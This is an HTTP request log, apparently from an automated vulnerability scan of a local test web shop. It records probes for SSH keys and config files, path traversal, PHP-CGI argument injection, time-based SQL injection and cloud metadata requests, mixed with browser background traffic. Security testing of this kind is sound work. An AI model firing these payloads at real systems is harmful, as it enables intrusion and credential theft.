Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
378,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/myserver.key,404,Not Found,24,430,25
379,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/key.pem,404,Not Found,12,428,20
380,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items,404,Not Found,55,426,63
381,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/id_rsa,404,Not Found,23,428,19
382,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items,404,Not Found,7,428,63
383,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/id_dsa,404,Not Found,54,428,19
384,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items,404,Not Found,54,428,63
385,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_rsa,404,Not Found,14,430,24
386,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_dsa,404,Not Found,7,428,24
387,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/adminer.php,404,Not Found,51,430,24
388,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/vb_test.php,404,Not Found,5,428,24
389,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/CHANGELOG.txt,404,Not Found,5,426,26
390,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/sites/default/files/.ht.sqlite,404,Not Found,45,430,43
391,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/composer.json,404,Not Found,22,429,26
392,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/composer.lock,404,Not Found,6,430,26
393,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/vim_settings.xml,404,Not Found,54,426,29
394,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/server-info,404,Not Found,7,430,24
395,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/phpinfo.php,404,Not Found,11,428,24
396,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/info.php,404,Not Found,51,426,21
397,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/i.php,404,Not Found,13,430,18
398,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/test.php,404,Not Found,10,426,21
399,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/.hg,404,Not Found,52,428,16
400,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/.bzr,404,Not Found,6,428,17
401,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/._darcs,404,Not Found,92,429,20
402,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/BitKeeper,404,Not Found,147,427,22
403,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/4342213316484000486,200,OK,278,229,84
404,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,316,229,84
405,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/7508334885752352578,200,OK,324,229,84
407,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,194,229,84
408,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/2471231757395544868,200,OK,272,229,84
409,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,246,229,84
410,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/4626148186993195839,200,OK,223,229,84
412,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,182,229,84
413,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/8180840957550825964,200,OK,285,229,84
414,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,245,229,84
415,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,252,229,84
416,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/1986707262499324508,200,OK,257,229,84
418,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:22 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1203,201,1497
419,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,205,229,84
420,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,54,433,28
421,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,52,428,43
422,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,12,428,42
423,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,12,432,57
424,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,190,229,84
425,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,34,434,110
426,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,51,431,110
427,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,208,229,84
428,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,160,229,84
429,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,176,229,84
430,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:23 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1494,201,1497
431,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,283,229,84
432,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,306,229,84
433,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/monitor/collections/changes/changeset?collection=query-stripping&bucket=main&_expected=0,200,OK,717,521,223
434,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/main/collections/query-stripping/changeset?_expected=1678736907773,200,OK,23,523,1854
435,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,189,229,84
436,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,260,229,84
437,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/monitor/collections/changes/changeset?collection=query-stripping&bucket=main&_expected=0,200,OK,222,521,223
438,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,326,474,56086
439,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/8587773559247258086,200,OK,164,229,84
440,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,26,431,24
441,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,56,431,24
442,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,605,506,56086
443,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/7766499857783186065,200,OK,224,229,84
445,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/main/collections/query-stripping/changeset?_expected=1678736907773,200,OK,101,523,1854
446,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,249,229,84
447,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,331,229,84
448,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-track-digest256/1668785275,200,OK,146,502,2165
449,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-track-digest256/1668785275,200,OK,159,485,2165
450,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://content-signature-2.cdn.mozilla.net/chains/remote-settings.content-signature.mozilla.org-2023-04-30-16-53-14.chain,200,OK,157,516,5348
451,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://content-signature-2.cdn.mozilla.net/chains/remote-settings.content-signature.mozilla.org-2023-04-30-16-53-14.chain,200,OK,33,516,5348
452,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/analytics-track-digest256/1663274228,200,OK,127,473,10230
453,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/analytics-track-digest256/1663274228,200,OK,98,473,10230
454,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-track-digest256/1670952926,200,OK,77,474,15414
455,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-track-digest256/1670952926,200,OK,75,474,15414
456,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/mozstd-trackwhite-digest256/1670952926,200,OK,318,487,337079
457,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/mozstd-trackwhite-digest256/1670952926,200,OK,300,487,337079
458,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:27 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,1945,230,84
459,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:27 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers?name=abc,200,OK,1904,230,84
460,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:27 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue?name=abc,200,OK,1983,230,84
461,Mon Mar 20 21:52:27 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,1600,428,28
462,Mon Mar 20 21:52:28 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/google-trackwhite-digest256/1604686195,200,OK,1160,496,1470328
463,Mon Mar 20 21:52:29 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,528,430,43
464,Mon Mar 20 21:52:29 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,40,429,42
465,Mon Mar 20 21:52:29 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,12,428,57
466,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:30 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,277,309,24
467,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:30 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/google-trackwhite-digest256/1604686195,200,OK,506,496,1470328
468,Mon Mar 20 21:52:27 CET 2023,Mon Mar 20 21:52:30 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,3223,230,84
469,Mon Mar 20 21:52:32 CET 2023,Mon Mar 20 21:52:32 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-fingerprinting-track-digest256/1663274228,200,OK,107,473,3605
470,Mon Mar 20 21:52:32 CET 2023,Mon Mar 20 21:52:32 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-cryptomining-track-digest256/1604686195,200,OK,153,485,2261
471,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:33 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-facebook-digest256/1604686195,200,OK,464,471,436
472,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:33 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-fingerprinting-track-digest256/1663274228,200,OK,303,473,3605
473,Mon Mar 20 21:52:34 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-cryptomining-track-digest256/1604686195,200,OK,257,485,2261
474,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,372,472,115
475,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,828,309,24
476,Mon Mar 20 21:52:34 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,275,472,212
477,Mon Mar 20 21:52:34 CET 2023,Mon Mar 20 21:52:35 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-facebook-digest256/1604686195,200,OK,520,483,436
478,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,137,473,6933
479,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,164,501,115
480,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,103,472,212
481,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-email-track-digest256/1668785275,200,OK,103,473,8821
482,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,133,505,6933
483,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:37 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-email-track-digest256/1668785275,200,OK,100,473,8821
484,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:37 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,7109,230,84
485,Mon Mar 20 21:52:37 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,2239,230,84
486,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,68,432,110
487,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,50,437,110
488,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,298,229,84
489,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,170,229,84
490,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,156,229,84
491,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,178,229,84
492,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,476,229,84
493,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,471,229,84
494,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,251,229,84
495,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,359,229,84
496,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,518,229,84
497,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,494,229,84
498,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,369,229,84
499,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,319,229,84
500,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,52,327,51
501,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,6,326,51
502,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,9,326,51
503,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,12,326,51
504,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,218,229,84
505,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,283,229,84
506,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,320,229,84
507,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,417,229,84
508,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/,200,OK,5,229,84
509,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,257,229,84
510,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,418,229,84
511,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,348,229,84
512,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,252,229,84
513,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,313,229,84
514,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,242,229,84
515,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,144,228,84
516,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,191,229,84
517,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,184,229,84
518,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,210,229,84
519,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,168,229,84
520,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1161,201,1497
521,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,231,229,84
522,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,319,229,84
523,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,240,229,84
524,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,357,229,84
525,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,422,229,84
526,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,317,229,84
527,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/elmah.axd,404,Not Found,143,436,22
528,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,172,229,84
529,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,375,229,84
530,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,453,474,56086
